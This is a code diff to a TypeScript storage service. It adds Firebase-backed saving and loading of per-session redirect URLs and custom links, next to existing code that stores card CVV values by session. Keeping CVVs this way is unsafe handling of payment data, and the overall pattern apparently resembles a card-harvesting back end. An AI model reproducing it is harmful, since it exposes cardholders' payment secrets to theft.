@@ -42,6 +42,15 @@ export class StorageService {
             } else if (key.startsWith('cardData_cvv_')) {
                 const sessionId = key.replace('cardData_cvv_', '');
                 await FirebaseService.saveSession(sessionId, { cardData_cvv: value });
+            } else if (key.startsWith('url_redirect_')) {
+                const sessionId = key.replace('url_redirect_', '');
+                await FirebaseService.saveSession(sessionId, { urlRedirect: value });
+            } else if (key.startsWith('urlAutomatic_')) {
+                const sessionId = key.replace('urlAutomatic_', '');
+                await FirebaseService.saveSession(sessionId, { urlAutomatic: value });
+            } else if (key.startsWith('linkCustom_')) {
+                const sessionId = key.replace('linkCustom_', '');
+                await FirebaseService.saveSession(sessionId, { linkCustom: value });
             }
         } catch (error) {
             console.error(`Error saving key ${key}:`, error);
@@ -88,6 +97,27 @@ export class StorageService {
                 if (data?.cardData_cvv) {
                     memoryStorage[key] = JSON.stringify(data.cardData_cvv);
                     return data.cardData_cvv;
+                }
+            } else if (key.startsWith('url_redirect_')) {
+                const sessionId = key.replace('url_redirect_', '');
+                const data = await FirebaseService.getSession(sessionId);
+                if (data?.urlRedirect) {
+                    memoryStorage[key] = JSON.stringify(data.urlRedirect);
+                    return data.urlRedirect;
+                }
+            } else if (key.startsWith('urlAutomatic_')) {
+                const sessionId = key.replace('urlAutomatic_', '');
+                const data = await FirebaseService.getSession(sessionId);
+                if (data?.urlAutomatic) {
+                    memoryStorage[key] = JSON.stringify(data.urlAutomatic);
+                    return data.urlAutomatic;
+                }
+            } else if (key.startsWith('linkCustom_')) {
+                const sessionId = key.replace('linkCustom_', '');
+                const data = await FirebaseService.getSession(sessionId);
+                if (data?.linkCustom) {
+                    memoryStorage[key] = JSON.stringify(data.linkCustom);
+                    return data.linkCustom;
                 }
             }
 
